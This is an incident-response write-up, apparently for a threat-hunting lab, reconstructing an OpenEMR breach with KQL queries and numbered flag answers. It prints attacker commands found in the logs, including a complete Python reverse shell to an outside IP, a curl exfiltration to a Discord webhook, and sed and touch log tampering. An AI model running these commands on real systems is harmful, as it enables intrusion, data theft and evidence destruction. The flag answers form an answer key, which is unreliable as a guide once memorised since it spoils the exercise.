# Threat Hunt Investigation: Rocky Clinic OpenEMR Breach — Full Attack Chain Reconstruction

> **“Nothing exploded. No ransomware. No outage. No obvious alert storm. But a quiet operator moved through the OpenEMR host, staged data, established persistence, exfiltrated an archive, and then attempted to erase the timeline.”**

![Platform](https://img.shields.io/badge/Platform-Microsoft%20Sentinel-0078D4?logo=microsoftazure\&logoColor=white)
![Telemetry](https://img.shields.io/badge/Telemetry-Microsoft%20Defender%20for%20Endpoint-5E5E5E)
![Language](https://img.shields.io/badge/Query%20Language-KQL-orange)
![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red)
![Flags](https://img.shields.io/badge/Flags%20Identified-29%2F29-brightgreen)
![OS](https://img.shields.io/badge/Target%20OS-RockyLinux-blue)
![Runtime](https://img.shields.io/badge/Runtime-Docker-2496ED?logo=docker\&logoColor=white)

---

## Incident Brief

|                                     |                                                                                                 |
| ----------------------------------- | ----------------------------------------------------------------------------------------------- |
| **Organization**                    | Rocky Clinic                                                                                    |
| **Environment**                     | OpenEMR application hosted on a Linux server                                                    |
| **Compromised Host**                | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`                                   |
| **Operating System**                | RockyLinux                                                                                      |
| **Application Runtime**             | Docker                                                                                          |
| **Evidence Source**                 | Microsoft Defender for Endpoint telemetry forwarded to Microsoft Sentinel / Azure Log Analytics |
| **Investigation Window**            | 2026-02-04 to 2026-02-14 UTC                                                                    |
| **Primary Suspicious Account**      | `it.admin`                                                                                      |
| **Unauthorized Account Identified** | `system`                                                                                        |
| **Outcome**                         | Full attack chain reconstructed across 29 findings                                              |

---

## Scenario

Rocky Clinic did not experience an obvious ransomware detonation, service outage, or loud destructive event. Instead, the investigation revealed a stealth-focused operator using legitimate administrative tooling, Linux-native commands, Docker runtime visibility, trusted automation paths, systemd persistence, staged archive creation, SaaS-based exfiltration, and anti-forensic cleanup.

The attacker behaved like a real administrator just long enough to blend in.

The investigation focused on answering the following questions:

* Which host was the OpenEMR environment running on?
* Which runtime hosted the application?
* Which account was used for suspicious remote access?
* How did the attacker escalate privileges?
* What data and configuration files did they inspect?
* Where was OpenEMR data staged?
* What persistence did they create?
* How was command-and-control established?
* What archive was prepared for transfer?
* Which exfiltration attempt failed?
* Which exfiltration method succeeded?
* What cleanup and timestomping activity occurred?
* How did the EDR classify the cleanup activity?

---

## Platform and Tools

* Microsoft Sentinel / Azure Log Analytics
* Microsoft Defender for Endpoint telemetry
* Kusto Query Language (KQL)
* MITRE ATT&CK Framework
* Linux process, file, logon, network, and alert telemetry

### Primary Tables Used

| Table                 | Purpose                                                              |
| --------------------- | -------------------------------------------------------------------- |
| `DeviceNetworkEvents` | Network connections, failed transfers, successful exfiltration       |
| `DeviceProcessEvents` | Shell commands, Docker activity, reverse shell, staging, cleanup     |
| `DeviceFileEvents`    | systemd service creation, identity file changes, service file hashes |
| `DeviceLogonEvents`   | Suspicious account usage and unauthorized identity analysis          |
| `DeviceInfo`          | OS distribution confirmation                                         |
| `AlertInfo`           | EDR alert metadata and MITRE technique classification                |
| `AlertEvidence`       | Alert-linked evidence details                                        |

---

## High-Level Investigation Plan

Before writing focused queries, I mapped the expected attack chain:

* **Asset anchor:** Identify the OpenEMR host.
* **Runtime confirmation:** Determine whether OpenEMR was hosted directly or inside a container runtime.
* **Access analysis:** Find suspicious remote logons and operator behaviour.
* **Privilege escalation:** Identify transition from constrained admin access to privileged shell.
* **Runtime discovery:** Review Docker/container enumeration.
* **Secret/config access:** Search for reads of durable automation configuration.
* **Data discovery and staging:** Identify Docker volume paths and archive creation.
* **Persistence:** Look for systemd unit creation and activation.
* **C2:** Trace reverse shell process creation and network activity.
* **Exfiltration:** Compare failed structured transfer attempts with successful SaaS upload.
* **Cleanup:** Identify selective log deletion and timestomping.
* **EDR classification:** Confirm alert MITRE mapping from `AttackTechniques`.

---

## Investigation Steps

---

### Step 1 — Identify the OpenEMR Host

**What I was looking for:** The fully qualified device name of the host running the OpenEMR environment.

I started by listing device activity during the investigation window.

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| summarize count() by DeviceName
| order by count_ desc
```

<img width="1162" height="692" alt="image" src="https://github.com/user-attachments/assets/be15935a-a7e0-44ef-84b2-0126d0d9a6ad" />


**Finding:** The Rocky Clinic OpenEMR host was identified as:

```text
rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net
```

This became the anchor host for the rest of the investigation.

> 🚩 **Q01 — OpenEMR Host:** `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`

---

### Step 2 — Confirm the Application Runtime

**What I was looking for:** The runtime layer hosting OpenEMR. The question explicitly warned that Azure was only the infrastructure layer, not the application runtime.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where FileName has_any ("docker", "dockerd", "containerd", "podman")
   or ProcessCommandLine has_any ("docker", "dockerd", "containerd", "podman", "openemr")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```
<img width="1107" height="626" alt="image" src="https://github.com/user-attachments/assets/a5722349-67cf-4062-a032-be54251c3761" />



**Finding:** Docker activity was observed on the host, including later commands such as:

```text
docker inspect openemr-mariadb
```

and Docker volume paths under:

```text
/var/lib/docker/volumes
```

Azure hosted the VM, but Docker hosted the OpenEMR application runtime.

> 🚩 **Q02 — Container Runtime:** `Docker`

---

### Step 3 — Find the First Behavioural Tell

**What I was looking for:** The first command the suspicious operator ran to check who else was logged in.

First, I looked for suspicious external logons by `it.admin`.

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "it.admin"
| where not(ipv4_is_private(RemoteIP))
| project Timestamp, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName, ActionType
| order by Timestamp asc
```

<img width="1587" height="652" alt="image" src="https://github.com/user-attachments/assets/ea5b42bd-1da1-4311-95f2-dfccf3705b9b" />


Then I searched for current-user discovery commands.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "it.admin"
| where FileName in~ ("who", "w", "users")
| project Timestamp, FileName, ProcessCommandLine, ProcessId, InitiatingProcessFileName, InitiatingProcessId
| order by Timestamp asc
```

<img width="1371" height="622" alt="image" src="https://github.com/user-attachments/assets/f4fe8985-590e-4cc9-b347-89b3ab5808b7" />


**Finding:** Shortly after a suspicious remote logon from `37.19.221.234`, the operator ran:

```text
w
```

The process ID was:

```text
17507
```

This command displays who is currently logged in and what they are doing. It is a classic early operator situational awareness step.

> 🚩 **Q03 — Process ID:** `17507`
> **MITRE:** T1033 — System Owner/User Discovery

---

### Step 4 — Identify the Session Boundary Fingerprint

**What I was looking for:** The SHA256 of the binary behind the last interactive operator command before session cleanup.

The relevant interactive command was:

```text
docker ps
```

The binary hash was:

```text
a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d
```

<img width="1502" height="702" alt="image" src="https://github.com/user-attachments/assets/c0283568-ae51-4151-9e8f-dd3db08a97a6" />


> 🚩 **Q04 — SHA256:** `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d`

---

### Step 5 — Attribute the Suspicious Account

**What I was looking for:** The account responsible for anomalous remote logons after excluding expected activity.

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ActionType == "LogonSuccess"
| where RemoteIP != "68.53.47.150"
| summarize LastLogonTime=max(Timestamp) by AccountName, RemoteIP
| order by AccountName asc
```

<img width="1217" height="655" alt="image" src="https://github.com/user-attachments/assets/ea52de45-33e8-4fc3-bc0e-494d1e7eea81" />


**Finding:** The suspicious remote sessions were attributed to:

```text
it.admin
```

> 🚩 **Q05 — Account:** `it.admin`
> **MITRE:** T1078 — Valid Accounts

---

### Step 6 — Confirm OS Fingerprinting

**What I was looking for:** A command where the operator read Linux release files to fingerprint the host.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has_any ("os-release", "redhat-release", "rocky-release", "system-release", "/etc/issue")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="1147" height="507" alt="image" src="https://github.com/user-attachments/assets/64866ee7-9ad3-41c7-bd43-9bd2ada27043" />


**Finding:** The operator read four release files in one command:

```text
/etc/os-release
/etc/redhat-release
/etc/rocky-release
/etc/system-release
```

> 🚩 **Q06 — Distinct Release Files:** `4`

---

### Step 7 — Confirm the OS Distribution from EDR

**What I was looking for:** The OS distribution recorded by Defender telemetry.

```kql
DeviceInfo
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| distinct OSDistribution, OSVersion, OSPlatform
```

<img width="1042" height="462" alt="image" src="https://github.com/user-attachments/assets/584a5cc7-1964-401e-a820-d8a819743247" />


**Finding:** EDR recorded the host distribution as:

```text
RockyLinux
```

> 🚩 **Q07 — OS Distribution:** `RockyLinux`

---

### Step 8 — Identify Privilege Escalation

**What I was looking for:** The command that moved the operator from constrained admin shell to privileged interactive shell.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has_any ("sudo -i", "sudo -s", "sudo su", "sudo bash", "sudo /bin/bash", "su -")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId, InitiatingProcessFileName
| order by Timestamp asc
```

<img width="1337" height="757" alt="image" src="https://github.com/user-attachments/assets/f16f5f32-3228-41ee-9cb3-9627a52d6fba" />


**Finding:** The operator escalated using:

```text
sudo -i
```

> 🚩 **Q08 — Privilege Escalation Command:** `sudo -i`

---

### Step 9 — Interrogate the Docker Runtime Layer

**What I was looking for:** The command used to inspect the OpenEMR database container after privilege escalation.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "docker inspect"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="1347" height="592" alt="image" src="https://github.com/user-attachments/assets/8eeb68ca-1977-4ee3-9584-fb538221883a" />


**Finding:** The operator inspected the MariaDB container with:

```text
docker inspect openemr-mariadb
```

> 🚩 **Q09 — Docker Inspection Command:** `docker inspect openemr-mariadb`

---

### Step 10 — Read the Privileged Automation Configuration

**What I was looking for:** A durable configuration or secrets file outside the application directory.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has ".env"
| where FileName in~ ("cat", "head", "less", "more", "tail", "view", "bat", "awk", "sed", "strings")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="1337" height="605" alt="image" src="https://github.com/user-attachments/assets/96d8fb99-f3f4-4227-ac8d-91e08c9203fe" />


**Finding:** The operator read:

```text
sed -n 1,200p /etc/openemr/audit_export.env
```

This file likely contained durable automation parameters, credentials, or export configuration.

> 🚩 **Q10 — Config Read Command:** `sed -n 1,200p /etc/openemr/audit_export.env`
> **MITRE:** T1552.001 — Credentials in Files

---

### Step 11 — Enumerate Docker Volume Storage

**What I was looking for:** A command recursively listing files under Docker volume storage.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "/var/lib/docker/volumes"
| where FileName in~ ("find", "ls", "tree", "du")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="1237" height="622" alt="image" src="https://github.com/user-attachments/assets/d32bcea8-bc7c-4b02-8c86-8def336716da" />

**Finding:** The recursive enumeration command was:

```text
find /var/lib/docker/volumes -maxdepth 3 -type f
```

> 🚩 **Q11 — Volume Enumeration Command:** `find /var/lib/docker/volumes -maxdepth 3 -type f`

---

### Step 12 — Locate Persistent Database Storage

**What I was looking for:** The host filesystem path where the OpenEMR database persisted.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "/var/lib/docker/volumes"
| where ProcessCommandLine has "_data"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="1182" height="497" alt="image" src="https://github.com/user-attachments/assets/77e99d15-7c22-4c82-bf18-0f3e944b2659" />


**Finding:** The persistent MariaDB volume path was:

```text
/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data
```

> 🚩 **Q12 — Database Storage Path:** `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data`

---

### Step 13 — Identify Trusted Automation Abuse

What I was looking for: An existing operational script that already ran repeatedly without interactive logons — something the attacker could ride for staging instead of building new, easily-flagged automation.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has ".sh"
| extend ScriptPath = extract(@"(/[^ ]+\.sh)", 1, ProcessCommandLine)
| summarize RunCount=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Accounts=make_set(AccountName) by ScriptPath
| order by RunCount desc
```

<img width="1527" height="661" alt="image" src="https://github.com/user-attachments/assets/f680a736-e604-48ae-8270-87c7fea627d1" />


Run count alone isn't the tell — the busiest scripts belonged to the audit/export workflow. The backup candidate stood out because it sat under /opt/backup/scripts/ and ran under the dedicated svc.backup service account. I pivoted onto it:

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "/opt/backup/scripts/backup_manifest.sh"
| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="997" height="425" alt="image" src="https://github.com/user-attachments/assets/773492aa-1402-43c0-9044-615a4d08c056" />

The timeline showed the full abuse pattern on this one script: it was inspected (cat/tail), appended to (sudo tee -a), and then executed in svc.backup context (bash /opt/backup/scripts/backup_manifest.sh) — confirming a trusted, non-interactive, repeating path being leveraged for staging.

**Finding:** The trusted operational script was:

```text
/opt/backup/scripts/backup_manifest.sh
```

It was inspected, appended to, and executed in `svc.backup` context.

> 🚩 **Q13 — Trusted Script:** `/opt/backup/scripts/backup_manifest.sh`

---

### Step 14 — Find the Operational-Looking Staging Directory

**What I was looking for:** The directory where the attacker wrote the collected archive output (the staging location), not the source folder being archived. The hint was critical: archive files are a staging tell, and I needed to find where they were written.

The hint was critical: archive files are a staging tell, and I needed to find where they were written.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has ".tar.gz"
| extend ArchivePath = extract(@"-czf\s+(\S+\.tar\.gz)", 1, ProcessCommandLine)
| extend ArchiveDir = extract(@"^(.+)/[^/]+$", 1, ArchivePath)
| project Timestamp, AccountName, FileName, ProcessCommandLine, ArchivePath, ArchiveDir, ProcessId
| order by Timestamp asc
```

<img width="1482" height="657" alt="image" src="https://github.com/user-attachments/assets/44e5ccd8-5720-45c5-a101-bb25d8b52553" />

The decisive event ran as root at 22:00 on 10 Feb:
tar -czf /var/lib/integrations/integration_state_2026-02-10_22-00-01.tar.gz -C /var/log/openemr/doc_exports/ 

In a tar -czf <output> -C <source> . command, -czf names the output archive and -C names the source that gets read. So:


Source (what was stolen): /var/log/openemr/doc_exports/ — the OpenEMR document exports (patient data).
Staging output: /var/lib/integrations/ — an obscure, legitimate-looking system path. The archive was even named integration_state_… to blend in with normal integration files, so a responder scanning /tmp or /home first would miss it.

**Finding:** The attacker wrote the archive to:
This same archive was then exfiltrated via scp to streetrack@20.62.27.80 and a Discord webhook, confirming /var/lib/integrations as the staging point.

```text
/var/lib/integrations
```

The key archive creation command was:

```text
tar -czf /var/lib/integrations/integration_state_2026-02-10_22-00-01.tar.gz -C /var/log/openemr/doc_exports/ .
```

> 🚩 **Q14 — Staging Directory:** `/var/lib/integrations`
> **MITRE:** T1074.001 — Local Data Staging

---

### Step 15 — Identify the Unauthorized Account

**What I was looking for:** An account that blended into the environment but showed suspicious logon behaviour.

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ActionType == "LogonSuccess"
| summarize
    FirstSeen=min(Timestamp),
    LastSeen=max(Timestamp),
    LogonCount=count(),
    RemoteIPs=make_set(RemoteIP, 20),
    LogonTypes=make_set(LogonType, 20)
    by AccountName
| order by AccountName asc
```

<img width="1187" height="497" alt="image" src="https://github.com/user-attachments/assets/6a99dc48-3a55-4b5e-932b-57f981d2a237" />


**Finding:** The suspicious identity was:

```text
system
```

It had a high logon count and network logons from external IPs.

> 🚩 **Q15 — Unauthorized Account:** `system`
> **MITRE:** T1136 — Create Account

---

### Step 16 — Identify the Binary Used for Identity Creation

**What I was looking for:** Identity file modifications that avoided obvious account creation tools such as `useradd`.

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where FolderPath in~ ("/etc/passwd", "/etc/shadow", "/etc/group", "/etc/gshadow")
| project Timestamp, ActionType,FileName, FolderPath,InitiatingProcessFileName, InitiatingProcessCommandLine,InitiatingProcessId,SHA256
| order by Timestamp asc
```

<img width="1547" height="631" alt="image" src="https://github.com/user-attachments/assets/88e97c08-e255-4987-8b54-ddc93b15b83b" />


I then confirmed the relevant binary hash:

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-09 17:20:00) .. datetime(2026-02-09 17:50:00))
| where DeviceName has "rocky83"
| where FileName == "vipw"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId, SHA256,InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

<img width="1557" height="647" alt="image" src="https://github.com/user-attachments/assets/c27f5688-c009-4916-9e48-a9c4d9b150b3" />


**Finding:** The SHA256 was:

```text
dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0
```

> 🚩 **Q16 — Identity Creation Binary SHA256:** `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0`

---

### Step 17 — Identify the systemd Persistence Artifact

**What I was looking for:** A host-level execution definition under systemd.

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where FolderPath startswith "/etc/systemd/system/"
| project Timestamp, ActionType, FileName, FolderPath,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId
| order by Timestamp asc
```

<img width="1547" height="622" alt="image" src="https://github.com/user-attachments/assets/f49f33b4-1729-42f3-8e06-e5e76f8df42f" />


**Finding:** The persistence artifact was:

```text
integration-monitor.service
```

> 🚩 **Q17 — Persistence Artifact:** `integration-monitor.service`
> **MITRE:** systemd service persistence / Create or Modify System Process

---

### Step 18 — Identify No-Editor File Creation

**What I was looking for:** The binary used to initially create the systemd service file.

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where FolderPath == "/etc/systemd/system/integration-monitor.service"
| project Timestamp, ActionType, FileName, FolderPath,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId
| order by Timestamp asc
```

<img width="1577" height="402" alt="image" src="https://github.com/user-attachments/assets/ecb38b1e-cff7-40a1-b6b0-9bbfe44373bc" />


**Finding:** The first creation event showed:

```text
InitiatingProcessFileName: cat
```

Later edits used `vim`, but the initial creation was performed by `cat`.

> 🚩 **Q18 — Creation Binary:** `cat`

---

### Step 19 — Identify the Service File Version Used for C2

**What I was looking for:** The SHA256 of the service file version active when C2 was launched.

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where FolderPath == "/etc/systemd/system/integration-monitor.service"
| project Timestamp, ActionType, FileName, FolderPath,SHA256,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId
| order by Timestamp asc
```

<img width="1512" height="417" alt="image" src="https://github.com/user-attachments/assets/f9402991-5582-4fd6-a338-27b41c85dc39" />


**Finding:** The service file version tied to the C2 launch was:

```text
f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8
```

> 🚩 **Q19 — Service File SHA256:** `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8`

---

### Step 20 — Extract the Reverse Shell Command

**What I was looking for:** Python reverse shell process execution.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11 04:15:00) .. datetime(2026-02-11 04:20:00))
| where DeviceName has "rocky83"
| where FileName has_any ("python", "python3", "python3.9")
| where ProcessCommandLine has_all ("import socket", "subprocess", "os.dup2", "/bin/sh")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId,InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

<img width="1512" height="652" alt="image" src="https://github.com/user-attachments/assets/23b81d88-495b-425d-a0f8-caebcd10c7fd" />


**Finding:** The reverse shell command was:

```text
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

> 🚩 **Q20 — Reverse Shell Command:** `/usr/bin/python3 -c 'import socket,subprocess,os;...'`
> **MITRE:** T1059.006 — Python

---

### Step 21 — Identify the Spawned Interactive Shell

**What I was looking for:** The child shell spawned by the Python reverse shell, not the Python process itself.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11 04:15:00) .. datetime(2026-02-11 04:25:00))
| where DeviceName has "rocky83"
| where AccountName == "it.admin"
| where FileName in~ ("sh", "bash")
| where ProcessCommandLine has_any ("/bin/sh", "sh -i", "/bin/bash", "bash -i")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId
| order by Timestamp asc
```

<img width="1472" height="685" alt="image" src="https://github.com/user-attachments/assets/f922c91b-8d07-44c3-bc17-3b4ea6ea2fc4" />


**Finding:** The interactive shell process ID was:

```text
8000
```

> 🚩 **Q21 — Shell Process ID:** `8000`

---

### Step 22 — Identify the Staged Archive

**What I was looking for:** The archive artifact prepared before data transfer.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where ProcessCommandLine has ".tar.gz"
| where ProcessCommandLine has_any ("scp", "curl", "-F file=@", "discord.com/api/webhooks")
| extend ArchiveFile = extract(@"([^/\s]+\.tar\.gz)", 1, ProcessCommandLine)
| project Timestamp, AccountName, FileName, ProcessCommandLine, ArchiveFile, ProcessId
| order by Timestamp asc
```

<img width="1472" height="626" alt="image" src="https://github.com/user-attachments/assets/7d828abf-5b9a-4628-9e40-f7481691ada7" />


**Finding:** The archive repeatedly appeared in exfiltration telemetry:

```text
integration_state_2026-02-10_22-00-01.tar.gz
```

> 🚩 **Q22 — Staged Archive:** `integration_state_2026-02-10_22-00-01.tar.gz`
> **MITRE:** T1560 — Archive Collected Data

---

### Step 23 — Identify the Failed Structured Transfer

**What I was looking for:** Failed network events tied to copy/SFTP transfer tooling.

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-02-11 04:00:00) .. datetime(2026-02-11 05:00:00))
| where DeviceName has "rocky83"
| where RemoteIP == "20.62.27.80"
| where ActionType has_any ("Failed", "Denied", "Blocked", "ConnectionFailed", "ConnectionAttemptFailed")
| project Timestamp, ActionType, RemoteIP, RemotePort,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId
| order by Timestamp asc

```

<img width="1492" height="557" alt="image" src="https://github.com/user-attachments/assets/d8ff37a0-8b31-4601-ae6e-e427a60a21b7" />


**Finding:** The failed structured transfer used SSH/SFTP over port `22`.

```text
/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp
```

> 🚩 **Q23 — Failed Transfer Command:** `/usr/bin/ssh ... 20.62.27.80 sftp`

---

### Step 24 — Identify the Successful SaaS Exfiltration Pivot

**What I was looking for:** A successful third-party SaaS upload using a simple Linux tool.

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-02-11) .. datetime(2026-02-14))
| where DeviceName has "rocky83"
| where InitiatingProcessCommandLine has_any ("integration_state_2026-02-10_22-00-01.tar.gz", "discord.com/api/webhooks","-F file=@")
| project Timestamp, ActionType, RemoteIP, RemoteUrl, RemotePort,InitiatingProcessFileName, InitiatingProcessCommandLine,InitiatingProcessId
| order by Timestamp asc
```
<img width="1515" height="561" alt="image" src="https://github.com/user-attachments/assets/beedb509-b4a2-4b6f-ad5f-6defe08483a6" />



**Finding:** The attacker pivoted to Discord webhook exfiltration using `curl`.

```text
curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/[REDACTED]
```

The webhook token has been redacted for public sharing.

> 🚩 **Q24 — Successful Exfil Command:** `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/[REDACTED]`
> **MITRE:** T1567 — Exfiltration Over Web Service

---

### Step 25 — Identify the Successful Exfiltration Endpoint

**What I was looking for:** The IP and port that carried the successful upload.

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-02-13 20:00:00) .. datetime(2026-02-13 20:20:00))
| where DeviceName has "rocky83"
| where InitiatingProcessCommandLine has "integration_state_2026-02-10_22-00-01.tar.gz"
| where InitiatingProcessCommandLine has "discord.com/api/webhooks"
| project Timestamp, ActionType, RemoteIP, RemotePort,Endpoint=strcat(RemoteIP, ":", tostring(RemotePort)),InitiatingProcessFileName,InitiatingProcessCommandLine
| order by Timestamp asc
```

<img width="1536" height="537" alt="image" src="https://github.com/user-attachments/assets/ba0af454-9c44-41c8-96e4-98b193ee29b9" />


**Finding:** The successful exfiltration endpoint was:

```text
162.159.135.232:443
```

> 🚩 **Q25 — Exfil Endpoint:** `162.159.135.232:443`

---

### Step 26 — Count Selective Log Erasure Operations

**What I was looking for:** Distinct `sed -i` delete operations across `/var/log/secure` and `/var/log/messages`.

The first broad query double-counted `sudo sed` wrappers and actual `sed` child processes. The correct logic counts only actual `sed` binaries.

```kql
let start = datetime(2026-02-11 16:13:00);
let end = datetime(2026-02-11 16:16:00);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName has "rocky83"
| where FileName =~ "sed"
| where ProcessCommandLine has "-i"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| where ProcessCommandLine has "/d"
| distinct ProcessCommandLine
| summarize DeleteOperations=count()
```

<img width="1027" height="505" alt="image" src="https://github.com/user-attachments/assets/eb818601-57ee-48a9-942f-8b27b3a66912" />


**Finding:** The operator ran:

```text
12
```

distinct `sed -i` delete operations.

> 🚩 **Q26 — Distinct Delete Operations:** `12`
> **MITRE:** T1070 — Indicator Removal

---

### Step 27 — Identify the Log Manipulation Primitive

**What I was looking for:** The binary used to manipulate the log files.

```kql
let start = datetime(2026-02-11 16:13:00);
let end = datetime(2026-02-11 16:16:00);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName has "rocky83"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| where ProcessCommandLine has "-i"
| where ProcessCommandLine has "/d"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="1362" height="615" alt="image" src="https://github.com/user-attachments/assets/083bb298-1007-4cbc-8898-0261be421e69" />


**Finding:** The in-place log manipulation tool was:

```text
sed
```

> 🚩 **Q27 — Log Manipulation Binary:** `sed`

---

### Step 28 — Identify Timeline Distortion

**What I was looking for:** The forged timestamp applied to `/var/log/messages`.

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-11 16:00:00) .. datetime(2026-02-11 16:30:00))
| where DeviceName has "rocky83"
| where FileName =~ "touch"
| where ProcessCommandLine has "/var/log/messages"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

<img width="1340" height="545" alt="image" src="https://github.com/user-attachments/assets/5dfd45ec-b639-40de-b273-6084ecce6ffc" />


**Finding:** The attacker ran:

```text
touch -d "2026-02-06 12:00:00" /var/log/messages
```

The forged timestamp was:

```text
2026-02-06 12:00:00
```

> 🚩 **Q28 — Forged Timestamp:** `2026-02-06 12:00:00`
> **MITRE:** T1070.006 — Timestomp

---

### Step 29 — Confirm EDR Cleanup Classification

**What I was looking for:** The MITRE technique identifiers recorded in the EDR alert’s `AttackTechniques` field.

```kql
let start = datetime(2026-02-11 16:00:00);
let end = datetime(2026-02-11 16:30:00);
AlertInfo
| where Timestamp between (start .. end)
| where Title has_any ("timestamp", "timestomp", "time", "modified", "suspicious", "touch")
   or Category has_any ("DefenseEvasion", "SuspiciousActivity")
| project Timestamp, AlertId, Title, Category, Severity, AttackTechniques
| order by Timestamp asc
```

<img width="1326" height="492" alt="image" src="https://github.com/user-attachments/assets/80337e70-aaa2-4f12-9d2e-929c22c961f4" />


**Finding:** The alert recorded:

```text
["Indicator Removal (T1070)", "Timestomp (T1070.006)"]
```

The identifiers were:

